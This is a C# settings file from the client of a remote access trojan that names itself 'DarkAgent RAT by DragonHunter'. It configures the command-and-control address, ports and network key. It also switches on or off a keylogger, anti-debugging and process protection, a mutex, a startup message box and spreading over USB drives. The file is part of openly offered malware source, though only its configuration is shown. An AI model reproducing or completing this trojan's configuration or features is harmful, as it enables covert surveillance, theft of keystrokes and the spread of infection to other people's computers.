using System;
using System.Collections.Generic;
using System.Text;
using System.Windows.Forms;

namespace DarkAgent_Client.src.Utils
{
    public class Settings
    {
        //Data Connection
        public static string ConnectIP = "127.0.0.1";
        public static int ConnectPort = 6132;
        public static int NetworkKey = 0xB65F6;

        //FileTransfer Connection
        public static string File_ConnectIP = "127.0.0.1";
        public static int File_ConnectPort = 6133;
        public static int File_NetworkKey = 0xB65F6;

        /* Keylogger Settings */
        public static bool Keylogger_Enable = false;
        public static int Keylogger_Delay = 0; //Delay in mili seconds, 1000=1second

        /* Process Protection */
        public static bool SystemProcess_Protect = false; //Don't use for debugging!
        public static bool SystemProcess_CheckParentProcess = false; //This is for anti-debug

        /* MUTEX */
        public static bool Mutex_Enable = true;
        public static string Mutex_MUTEX = ""; //leave empty to have a random MUTEX

        /* MessageBox at startup */
        public static bool MsgBox_Enable = false;
        public static bool MsgBox_MultiThread = false;
        public static string MsgBox_Text = "Thanks for using DarkAgent RAT by DragonHunter";
        public static string MsgBox_Title = "";
        public static MessageBoxButtons MsgBox_Buttons = MessageBoxButtons.OK;
        public static MessageBoxIcon MsgBox_Icon = MessageBoxIcon.None;

        /* Spreaders */
        public static bool Spread_Usb = false;
    }
}